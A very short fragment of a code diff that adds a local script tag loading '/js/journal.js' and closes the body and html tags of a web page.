+    <script src="/js/journal.js"></script>
+    </body>
+</html>
